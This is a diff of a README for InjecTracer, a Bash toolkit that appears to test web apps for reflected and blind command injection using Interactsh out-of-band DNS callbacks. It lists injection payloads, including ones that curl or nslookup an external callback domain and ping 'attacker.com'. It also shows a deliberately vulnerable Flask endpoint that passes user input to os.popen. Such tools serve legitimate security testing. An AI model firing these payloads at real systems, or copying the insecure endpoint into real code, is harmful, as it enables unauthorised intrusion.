@@ -1,150 +1,163 @@
+# 🧪 InjecTracer - Blind & Reflected Command Injection Detection Toolkit
 
-# InjecTracer
+InjecTracer is a bash-powered toolkit for detecting **reflected** and **blind** command injection vulnerabilities in HTTP-based applications using **DNS-based exfiltration via Interactsh**. It supports dynamic payload injection into URLs, headers, JSON, and form bodies.
 
-**InjecTracer** is a lightweight Bash-based injection payload tracer for testing command injection and other vulnerabilities via GET and POST HTTP methods. It supports dynamic payload injection via path, parameters, or POST body, and saves the results in structured JSON format.
+![banner](./assets/injecTrace.png)
+
+> 💥 Built for researchers and bug bounty hunters who want **automation with precision**.
 
 ---
 
 ## 🚀 Features
 
-- Accepts inputs via `input.json`
-- Supports GET and POST methods
-- Injects payloads in:
-  - Path (URL with `INJECT_HERE`)
-  - Query parameters
-  - POST body (form-style)
-- Adds headers from input
-- Uses `curl` for HTTP requests
-- Extracts output from `<pre>` tags or raw body
-- Outputs results to `results.json`
+- ✅ Reflected command injection detection (`GET`/`POST`)
+- 🔒 Blind command injection detection with **OOB DNS interaction**
+- 📦 Supports:
+  - URL parameters (`INJECT_HERE`)
+  - POST body fields (x-www-form-urlencoded)
+  - JSON body fields
+  - HTTP headers
+- 🛡️ Automatic CSRF token & session handling
+- 📊 Output in structured `results.json`
+- 🔄 Replaces `{{DOMAIN}}` in payloads with live interactsh OOB domain
+- 🧠 Auto-parses Interactsh logs to correlate responses
 
 ---
 
-## 📂 File Structure
+## 📁 Project Structure
 
 ```
 InjecTracer/
-├── InjecTracer.sh       # Main script
-├── input.json           # Input configuration
-├── payloads.txt         # List of payloads to inject
-└── results.json         # Output results in JSON
+├── blinddns-env/             # (Optional) Python/Go environment
+├── interactsh/               # Interactsh source (auto-cloned)
+├── InjecTracer.sh            # Main injection logic
+├── input.json                # Target config (method, URL, headers, etc.)
+├── payloads.txt              # List of command injection payloads
+├── results.json              # Final output with detection logs
+├── requirement.sh            # Installs and builds Interactsh
+└── run.sh                    # Starts a full scan run
 ```
 
 ---
 
-## 📥 Example: input.json
+## 🛠️ Setup
+
+### 1. Install Go
+
+```bash
+sudo apt install golang -y
+```
+
+### 2. Clone and Build Interactsh
+
+```bash
+chmod +x requirement.sh
+./requirement.sh
+```
+
+---
+
+## ⚙️ Usage
+
+### Step 1: Define Target in `input.json`
 
 ```json
 {
   "method": "POST",
-  "url": "http://example.com/submit",
-  "headers": {
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "InjecTracerBot/1.0"
-  },
+  "url": "http://127.0.0.1:5000/contact",
   "body": {
-    "email": "test@INJECT_HERE.com",
-    "name": "user"
+    "name": "test",
+    "email": "INJECT_HERE",
+    "message": "1234567890"
+  },
+  "headers": {
+    "Content-Type": "application/x-www-form-urlencoded"
   }
 }
 ```
 
-### For GET request with path injection:
+> 🔍 Supports `inject_into`: `"body"`, `"json"`, `"params"`, `"headers"`  
+> 🔑 Supports CSRF token & session cookie auto-handling
+
+---
+
+### Step 2: Add Payloads in `payloads.txt`
+
+```txt
+127.0.0.1;whoami
+x||nslookup+x.{{DOMAIN}}||
+x||curl+http://{{DOMAIN}}||
+x||whoami||
+```
+
+> `{{DOMAIN}}` will be replaced with Interactsh's dynamic OOB domain
+
+---
+
+### Step 3: Run It
+
+```bash
+chmod +x run.sh InjecTracer.sh
+./run.sh
+```
+
+> Output will be stored in `results.json`
+
+---
+
+## 🔍 Sample `results.json` Output
 
 ```json
 {
-  "method": "GET",
-  "url": "http://example.com/INJECT_HERE",
-  "headers": {
-    "User-Agent": "InjecTracerBot/1.0"
-  }
+  "payload": "x||whoami||",
+  "url": "http://127.0.0.1:5000/contact",
+  "location": "body",
+  "output": "Thank you, test!\nYour message: 1234567890\nPing result for x||whoami||:\n\n",
+  "blind": "true",
+  "dns_response": "ApP.Py.D26xyzabc123.oast.site"
 }
 ```
 
----
+## 🧠 How It Works
 
-## 🧨 Example: payloads.txt
-
-```
-;id;
-|whoami|
-$(uname -a)
-`ls`
-& ping -c 1 attacker.com &
-```
+1. Starts Interactsh in background
+2. Gets dynamic OOB DNS domain
+3. Injects payloads into defined points
+4. For reflected injection: parses HTML output
+5. For blind injection: waits and fetches `full-id` from Interactsh logs
+6. Compiles all results into a neat JSON report
 
 ---
 
-## 📤 Example: results.json
+## 🧪 Test with Sample Flask App
 
-```json
-[
-  {
-    "payload": ";id;",
-    "url": "http://example.com/submit",
-    "location": "body",
-    "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
-  },
-  {
-    "payload": "|whoami|",
-    "url": "http://example.com/submit",
-    "location": "body",
-    "output": "www-data"
-  }
-]
+You can test against this vulnerable endpoint:
+
+```python
+@app.route('/contact', methods=['POST'])
+def contact():
+    email = request.form.get('email')
+    output = os.popen(f"ping -c 1 {email}").read()
+    return f"Ping result for {email}:\n{output}"
 ```
 
 ---
 
-## ✅ Usage
+## 📌 Notes
 
-1. **Place your payloads in** `payloads.txt`
-2. **Edit** `input.json` to match the request details
-3. **Run the script:**
-
-```bash
-chmod +x InjecTracer.sh
-./InjecTracer.sh
-```
-
-4. **Check the output:**
-
-```bash
-cat results.json | jq
-```
+- Requires `jq`, `curl`, `git`, `go`, and Internet access.
+- Works with any HTTP target (no browser required).
+- You can add `whoami`, `id`, or `nslookup`..,etc payloads.
 
 ---
 
-## 🛠 Dependencies
+## 👨‍💻 Author
 
-- `jq`
-- `curl`
-- `sed`, `perl` (for response parsing)
-
-Install on Debian-based system:
-
-```bash
-sudo apt update
-sudo apt install jq curl
-```
+Crafted by [Amal P](https://github.com/amalpvatayam67/)  
+For educational and ethical penetration testing purposes only.
 
 ---
 
-## 🧑‍💻 Author
+## 📜 License
 
-**Amal P.**  
-Cybersecurity Researcher  
-🔍 Focus: Injection Testing, Automation Tools, DNS-Based Detection  
-
----
-
-## 📄 License
-
-MIT License – Free to use and modify.
-
----
-
-## 📣 Notes
-
-- Ensure the target accepts requests and returns meaningful output in `<pre>` or readable format.
-- Tool does **not** follow redirects automatically; modify `curl` flags if needed.
+MIT License
